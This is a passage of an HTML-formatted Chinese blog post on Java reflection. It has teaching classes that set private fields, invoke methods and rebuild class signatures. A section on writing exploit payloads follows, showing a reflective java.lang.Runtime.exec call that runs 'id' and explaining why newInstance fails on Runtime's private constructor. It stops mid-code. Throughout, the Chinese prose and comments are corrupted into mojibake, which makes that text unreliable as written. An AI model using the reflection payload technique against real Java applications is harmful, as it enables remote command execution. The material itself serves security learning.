è·å–å±æ€§çš„å€¼get</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest07</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//ä¸ä½¿ç”¨åå°„æœºåˆ¶ç»™å±æ€§èµ‹å€¼</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        <span class="comment">/**ç»™å±æ€§èµ‹å€¼ä¸‰è¦ç´ ï¼šç»™så¯¹è±¡çš„noå±æ€§èµ‹å€¼1111</span></span><br><span class="line"><span class="comment">         * è¦ç´ 1ï¼šå¯¹è±¡s</span></span><br><span class="line"><span class="comment">         * è¦ç´ 2ï¼šnoå±æ€§</span></span><br><span class="line"><span class="comment">         * è¦ç´ 3ï¼š1111</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        student.no = <span class="number">1111</span>;</span><br><span class="line">        <span class="comment">/**è¯»å±æ€§å€¼ä¸¤ä¸ªè¦ç´ ï¼šè·å–så¯¹è±¡çš„noå±æ€§çš„å€¼ã€‚</span></span><br><span class="line"><span class="comment">         * è¦ç´ 1ï¼šå¯¹è±¡s</span></span><br><span class="line"><span class="comment">         * è¦ç´ 2ï¼šnoå±æ€§</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(student.no);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨åå°„æœºåˆ¶ç»™å±æ€§èµ‹å€¼</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">studentClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Student&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> studentClass.newInstance();<span class="comment">// objå°±æ˜¯Studentå¯¹è±¡ã€‚ï¼ˆåº•å±‚è°ƒç”¨æ— å‚æ•°æ„é€ æ–¹æ³•ï¼‰</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–noå±æ€§ï¼ˆæ ¹æ®å±æ€§çš„åç§°æ¥è·å–Fieldï¼‰</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">noField</span> <span class="operator">=</span> studentClass.getDeclaredField(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        <span class="comment">// ç»™objå¯¹è±¡(Studentå¯¹è±¡)çš„noå±æ€§èµ‹å€¼</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            è™½ç„¶ä½¿ç”¨äº†åå°„æœºåˆ¶ï¼Œä½†æ˜¯ä¸‰è¦ç´ è¿˜æ˜¯ç¼ºä¸€ä¸å¯ï¼š</span></span><br><span class="line"><span class="comment">                è¦ç´ 1ï¼šobjå¯¹è±¡</span></span><br><span class="line"><span class="comment">                è¦ç´ 2ï¼šnoå±æ€§</span></span><br><span class="line"><span class="comment">                è¦ç´ 3ï¼š22222å€¼</span></span><br><span class="line"><span class="comment">            æ³¨æ„ï¼šåå°„æœºåˆ¶è®©ä»£ç å¤æ‚äº†ï¼Œä½†æ˜¯ä¸ºäº†ä¸€ä¸ªâ€œçµæ´»â€ï¼Œè¿™ä¹Ÿæ˜¯å€¼å¾—çš„ã€‚</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        noField.set(obj, <span class="number">22222</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¯»å–å±æ€§çš„å€¼</span></span><br><span class="line">        <span class="comment">// ä¸¤ä¸ªè¦ç´ ï¼šè·å–objå¯¹è±¡çš„noå±æ€§çš„å€¼ã€‚</span></span><br><span class="line">        System.out.println(noField.get(obj));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¯ä»¥è®¿é—®ç§æœ‰çš„å±æ€§å—ï¼Ÿ</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> studentClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">// æ‰“ç ´å°è£…ï¼ˆåå°„æœºåˆ¶çš„ç¼ºç‚¹ï¼šæ‰“ç ´å°è£…ï¼Œå¯èƒ½ä¼šç»™ä¸æ³•åˆ†å­ç•™ä¸‹æœºä¼šï¼ï¼ï¼ï¼‰</span></span><br><span class="line">        <span class="comment">// è¿™æ ·è®¾ç½®å®Œä¹‹åï¼Œåœ¨å¤–éƒ¨ä¹Ÿæ˜¯å¯ä»¥è®¿é—®privateçš„ã€‚</span></span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ç»™nameå±æ€§èµ‹å€¼</span></span><br><span class="line">        nameField.set(obj, <span class="string">&quot;xiaowu&quot;</span>);</span><br><span class="line">        <span class="comment">// è·å–nameå±æ€§çš„å€¼</span></span><br><span class="line">        System.out.println(nameField.get(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ä½œä¸ºäº†è§£å†…å®¹ï¼ˆä¸éœ€è¦æŒæ¡ï¼‰ï¼š</span></span><br><span class="line"><span class="comment">    åå°„Method</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest08</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">userServiceClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.UserService&quot;</span>);</span><br><span class="line">        <span class="comment">// è·å–æ‰€æœ‰çš„Methodï¼ˆåŒ…æ‹¬ç§æœ‰çš„ï¼ï¼‰</span></span><br><span class="line">        Method[] methods = userServiceClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods)&#123;</span><br><span class="line">            <span class="comment">// è·å–ä¿®é¥°ç¬¦åˆ—è¡¨</span></span><br><span class="line">            System.out.println(Modifier.toString(m.getModifiers()));</span><br><span class="line">            <span class="comment">// è·å–æ–¹æ³•çš„è¿”å›å€¼ç±»å‹</span></span><br><span class="line">            System.out.println(m.getReturnType().getSimpleName());</span><br><span class="line">            <span class="comment">// è·å–æ–¹æ³•å</span></span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">            <span class="comment">// æ–¹æ³•çš„ä¿®é¥°ç¬¦åˆ—è¡¨ï¼ˆä¸€ä¸ªæ–¹æ³•çš„å‚æ•°å¯èƒ½ä¼šæœ‰å¤šä¸ªã€‚ï¼‰</span></span><br><span class="line">            Class[] parameterTypes = m.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (Class pts : parameterTypes)&#123;</span><br><span class="line">                System.out.println(pts.getSimpleName());</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;------------------------&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">äº†è§£ä¸€ä¸‹ï¼Œä¸éœ€è¦æŒæ¡ï¼ˆåç¼–è¯‘ä¸€ä¸ªç±»çš„æ–¹æ³•ã€‚ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest09</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">userServiceClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line">        s.append(Modifier.toString(userServiceClass.getModifiers()));</span><br><span class="line">        s.append(<span class="string">&quot; class &quot;</span>);</span><br><span class="line">        s.append(userServiceClass.getSimpleName());</span><br><span class="line">        s.append(<span class="string">&quot; &#123;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ‰€æœ‰çš„Methodï¼ˆåŒ…æ‹¬ç§æœ‰çš„ï¼ï¼‰</span></span><br><span class="line">        Method[] methods = userServiceClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods)&#123;</span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="comment">// è·å–ä¿®é¥°ç¬¦åˆ—è¡¨</span></span><br><span class="line">            s.append(Modifier.toString(m.getModifiers()));</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">// è·å–æ–¹æ³•çš„è¿”å›å€¼ç±»å‹</span></span><br><span class="line">            s.append(m.getReturnType().getSimpleName());</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">// è·å–æ–¹æ³•å</span></span><br><span class="line">            s.append(m.getName());</span><br><span class="line">            s.append(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            <span class="comment">// æ–¹æ³•çš„ä¿®é¥°ç¬¦åˆ—è¡¨ï¼ˆä¸€ä¸ªæ–¹æ³•çš„å‚æ•°å¯èƒ½ä¼šæœ‰å¤šä¸ªã€‚ï¼‰</span></span><br><span class="line">            Class[] parameterTypes = m.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; parameterTypes.length; i++)&#123;</span><br><span class="line">                s.append(parameterTypes[i].getSimpleName());</span><br><span class="line">                <span class="keyword">if</span> (i != parameterTypes.length - <span class="number">1</span>) s.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            s.append(<span class="string">&quot;) &#123;&#125;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">é‡ç‚¹ï¼šå¿…é¡»æŒæ¡ï¼Œé€šè¿‡åå°„æœºåˆ¶æ€ä¹ˆè°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼Ÿ</span></span><br><span class="line"><span class="comment">    äº”é¢—æ˜Ÿ*****</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    åå°„æœºåˆ¶ï¼Œè®©ä»£ç å¾ˆå…·æœ‰é€šç”¨æ€§ï¼Œå¯å˜åŒ–çš„å†…å®¹éƒ½æ˜¯å†™åˆ°é…ç½®æ–‡ä»¶å½“ä¸­ï¼Œ</span></span><br><span class="line"><span class="comment">    å°†æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶ä¹‹åï¼Œåˆ›å»ºçš„å¯¹è±¡ä¸ä¸€æ ·äº†ï¼Œè°ƒç”¨çš„æ–¹æ³•ä¹Ÿä¸åŒäº†ï¼Œ</span></span><br><span class="line"><span class="comment">    ä½†æ˜¯javaä»£ç ä¸éœ€è¦åšä»»ä½•æ”¹åŠ¨ã€‚è¿™å°±æ˜¯åå°„æœºåˆ¶çš„é­…åŠ›ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest10</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ä¸ä½¿ç”¨åå°„æœºåˆ¶ï¼Œæ€ä¹ˆè°ƒç”¨æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserService</span>();</span><br><span class="line">        <span class="comment">// è°ƒç”¨æ–¹æ³•</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            è¦ç´ åˆ†æï¼š</span></span><br><span class="line"><span class="comment">                è¦ç´ 1ï¼šå¯¹è±¡userService</span></span><br><span class="line"><span class="comment">                è¦ç´ 2ï¼šloginæ–¹æ³•å</span></span><br><span class="line"><span class="comment">                è¦ç´ 3ï¼šå®å‚åˆ—è¡¨</span></span><br><span class="line"><span class="comment">                è¦ç´ 4ï¼šè¿”å›å€¼</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(userService.login(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123&quot;</span>) ? <span class="string">&quot;ç™»å…¥æˆåŠŸï¼&quot;</span> : <span class="string">&quot;ç™»å…¥å¤±è´¥ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨åå°„æœºåˆ¶è°ƒç”¨æ–¹æ³•</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">userServiceClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.UserService&quot;</span>);</span><br><span class="line">        <span class="comment">// åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> userServiceClass.newInstance();</span><br><span class="line">        <span class="comment">// è·å–Method</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">loginMethod</span> <span class="operator">=</span> userServiceClass.getDeclaredMethod(<span class="string">&quot;login&quot;</span>, String.class, String.class);</span><br><span class="line"><span class="comment">//        Method loginMethod = userServiceClass.getDeclaredMethod(&quot;login&quot;);//æ³¨ï¼šæ²¡æœ‰å½¢å‚å°±ä¸ä¼ </span></span><br><span class="line">        <span class="comment">// è°ƒç”¨æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨æ–¹æ³•æœ‰å‡ ä¸ªè¦ç´ ï¼Ÿ ä¹Ÿéœ€è¦4è¦ç´ ã€‚</span></span><br><span class="line">        <span class="comment">// åå°„æœºåˆ¶ä¸­æœ€æœ€æœ€æœ€æœ€é‡è¦çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¿…é¡»è®°ä½ã€‚</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            å››è¦ç´ ï¼š</span></span><br><span class="line"><span class="comment">            loginMethodæ–¹æ³•</span></span><br><span class="line"><span class="comment">            objå¯¹è±¡</span></span><br><span class="line"><span class="comment">            &quot;admin&quot;,&quot;123&quot; å®å‚</span></span><br><span class="line"><span class="comment">            retValue è¿”å›å€¼</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">resValues</span> <span class="operator">=</span> loginMethod.invoke(obj, <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123&quot;</span>);<span class="comment">//æ³¨ï¼šæ–¹æ³•è¿”å›å€¼æ˜¯void ç»“æœæ˜¯null</span></span><br><span class="line">        System.out.println(resValues);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">åç¼–è¯‘ä¸€ä¸ªç±»çš„Constructoræ„é€ æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest11</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Vip&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//public class UserService &#123;</span></span><br><span class="line">        s.append(Modifier.toString(vipClass.getModifiers()));</span><br><span class="line">        s.append(<span class="string">&quot; class &quot;</span>);</span><br><span class="line">        s.append(vipClass.getSimpleName());</span><br><span class="line">        s.append(<span class="string">&quot;&#123;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor[] constructors = vipClass.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor c : constructors)&#123;</span><br><span class="line">            <span class="comment">//public Vip(int no, String name, String birth, boolean sex) &#123;</span></span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            s.append(Modifier.toString(c.getModifiers()));</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="comment">//            s.append(c.getName());//åŒ…å+ç±»å</span></span><br><span class="line">            s.append(vipClass.getSimpleName());<span class="comment">//ç±»å</span></span><br><span class="line">            s.append(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            Class[] parameterTypes = c.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; parameterTypes.length; i++)&#123;</span><br><span class="line">                s.append(parameterTypes[i].getSimpleName());</span><br><span class="line">                <span class="keyword">if</span> (i != parameterTypes.length - <span class="number">1</span> ) s.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            s.append(<span class="string">&quot;)&#123;&#125;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æ¯”ä¸Šä¸€ä¸ªä¾‹å­(ReflectTest11)é‡è¦ä¸€äº›ï¼ï¼ï¼</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨æ„é€ æ–¹æ³•å®ä¾‹åŒ–javaå¯¹è±¡ã€‚ï¼ˆè¿™ä¸ªä¸æ˜¯é‡ç‚¹ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest12</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//ä¸é€‚ç”¨åå°„åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">        <span class="type">Vip</span> <span class="variable">vip1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vip</span>();</span><br><span class="line">        <span class="type">Vip</span> <span class="variable">vip2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vip</span>(<span class="number">123</span>, <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;2001-10-19&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨åå°„æœºåˆ¶åˆ›å»ºå¯¹è±¡ï¼ˆä»¥å‰ï¼‰</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Vip&quot;</span>);</span><br><span class="line">        <span class="comment">// è°ƒç”¨æ— å‚æ•°æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj1</span> <span class="operator">=</span> vipClass.newInstance();<span class="comment">//Classç±»çš„newInstanceæ–¹æ³•</span></span><br><span class="line">        System.out.println(obj1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨åå°„æœºåˆ¶åˆ›å»ºå¯¹è±¡ï¼ˆç°åœ¨ï¼‰</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨æœ‰å‚æ•°çš„æ„é€ æ–¹æ³•æ€ä¹ˆåŠï¼Ÿ</span></span><br><span class="line">        <span class="comment">// ç¬¬ä¸€æ­¥ï¼šå…ˆè·å–åˆ°è¿™ä¸ªæœ‰å‚æ•°çš„æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">c1</span> <span class="operator">=</span> vipClass.getDeclaredConstructor(<span class="type">int</span>.class, String.class, String.class, <span class="type">boolean</span>.class);</span><br><span class="line">        <span class="comment">// ç¬¬äºŒæ­¥ï¼šè°ƒç”¨æ„é€ æ–¹æ³•newå¯¹è±¡</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> c1.newInstance(<span class="number">321</span>, <span class="string">&quot;lsi&quot;</span>, <span class="string">&quot;1999-10-11&quot;</span>, <span class="literal">true</span>);<span class="comment">//Constructorç±»çš„newInstanceæ–¹æ³•</span></span><br><span class="line">        System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ— å‚æ•°æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">c2</span> <span class="operator">=</span> vipClass.getDeclaredConstructor();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj3</span> <span class="operator">=</span> c2.newInstance();</span><br><span class="line">        System.out.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">é‡ç‚¹ï¼šç»™ä½ ä¸€ä¸ªç±»ï¼Œæ€ä¹ˆè·å–è¿™ä¸ªç±»çš„çˆ¶ç±»ï¼Œå·²ç»å®ç°äº†å“ªäº›æ¥å£ï¼Ÿ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest13</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// Stringä¸¾ä¾‹</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="comment">// è·å–Stringçš„çˆ¶ç±»</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">superclass</span> <span class="operator">=</span> vipClass.getSuperclass();</span><br><span class="line">        <span class="comment">// è·å–Stringç±»å®ç°çš„æ‰€æœ‰æ¥å£ï¼ˆä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ã€‚ï¼‰</span></span><br><span class="line">        Class[] interfaces = vipClass.getInterfaces();</span><br><span class="line">        System.out.println(superclass.getName());</span><br><span class="line">        <span class="keyword">for</span> (Class i : interfaces) &#123;</span><br><span class="line">            System.out.println(i.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_44715943/article/details/120587716">https://blog.csdn.net/qq_44715943&#x2F;article&#x2F;details&#x2F;120587716</a></p><h2 id="6-nenstanceçš„ä½¿ç”¨"><a href="#6-nenstanceçš„ä½¿ç”¨" class="headerlink" title="6.nenstanceçš„ä½¿ç”¨"></a>6.nenstanceçš„ä½¿ç”¨</h2><p> class.newInstance() çš„ä½œç”¨å°±æ˜¯è°ƒç”¨è¿™ä¸ªç±»çš„æ— å‚æ„é€ å‡½æ•°ï¼Œè¿™ä¸ªæ¯”è¾ƒå¥½ç†è§£ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™ åœ¨å†™æ¼æ´åˆ©ç”¨æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå‘ç°ä½¿ç”¨ newInstance æ€»æ˜¯ä¸æˆåŠŸï¼Œè¿™æ—¶å€™åŸå› å¯èƒ½æ˜¯ï¼š</p><ol><li><p>ä½ ä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•° </p></li><li><p>ä½ ä½¿ç”¨çš„ç±»æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ æœ€æœ€æœ€å¸¸è§çš„æƒ…å†µå°±æ˜¯ java.lang.Runtime ï¼Œè¿™ä¸ªç±»åœ¨æˆ‘ä»¬æ„é€ å‘½ä»¤æ‰§è¡ŒPayloadçš„æ—¶å€™å¾ˆå¸¸è§ï¼Œä½† æˆ‘ä»¬ä¸èƒ½ç›´æ¥è¿™æ ·æ¥æ‰§è¡Œå‘½ä»¤ï¼š</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure><p>æŠ¥é”™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713774552001-2e3407dc-7609-444f-8082-257af26caed2.png"></p><p> åŸå› æ˜¯ Runtime ç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ã€‚ æœ‰åŒå­¦å°±æ¯”è¾ƒå¥½å¥‡ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰ç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œéš¾é“ä»–ä¸æƒ³è®©ç”¨æˆ·ä½¿ç”¨è¿™ä¸ªç±»å—ï¼Ÿè¿™å…¶å®æ¶‰åŠ åˆ°å¾ˆå¸¸è§çš„è®¾è®¡æ¨¡å¼ï¼šâ€œå•ä¾‹æ¨¡å¼â€ã€‚ï¼ˆæœ‰æ—¶å€™å·¥å‚æ¨¡å¼ä¹Ÿä¼šå†™æˆç±»ä¼¼ï¼‰ æ¯”å¦‚ï¼Œå¯¹äºWebåº”ç”¨æ¥è¯´ï¼Œæ•°æ®åº“è¿æ¥åªéœ€è¦å»ºç«‹ä¸€æ¬¡ï¼Œè€Œä¸æ˜¯æ¯æ¬¡ç”¨åˆ°æ•°æ®åº“çš„æ—¶å€™å†æ–°å»ºç«‹ä¸€ä¸ªè¿ æ¥ï¼Œæ­¤æ—¶ä½œä¸ºå¼€å‘è€…ä½ å°±å¯ä»¥å°†æ•°æ®åº“è¿æ¥ä½¿ç”¨çš„ç±»çš„æ„é€ å‡½æ•°è®¾ç½®ä¸ºç§æœ‰ï¼Œç„¶åç¼–å†™ä¸€ä¸ªé™æ€æ–¹æ³•æ¥ è·å–ï¼š  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainDB</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">TrainDB</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainDB</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="title function_">TrainDB</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// å»ºç«‹è¿æ¥çš„ä»£ç ...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> è¿™æ ·ï¼Œåªæœ‰ç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šæ‰§è¡Œä¸€æ¬¡æ„é€ å‡½æ•°ï¼Œåé¢åªèƒ½é€šè¿‡ getInstance è·å–è¿™ä¸ªå¯¹è±¡ï¼Œé¿å…å»º ç«‹å¤šä¸ªæ•°æ®åº“è¿æ¥ã€‚ å›åˆ°æ­£é¢˜ï¼ŒRuntimeç±»å°±æ˜¯å•ä¾‹æ¨¡å¼ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡ Runtime.getRuntime() æ¥è·å–åˆ° Runtime å¯¹ è±¡ã€‚æˆ‘ä»¬å°†ä¸Šè¿°Payloadè¿›è¡Œä¿®æ”¹å³å¯æ­£å¸¸æ‰§è¡Œå‘½ä»¤äº†ï¼š  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 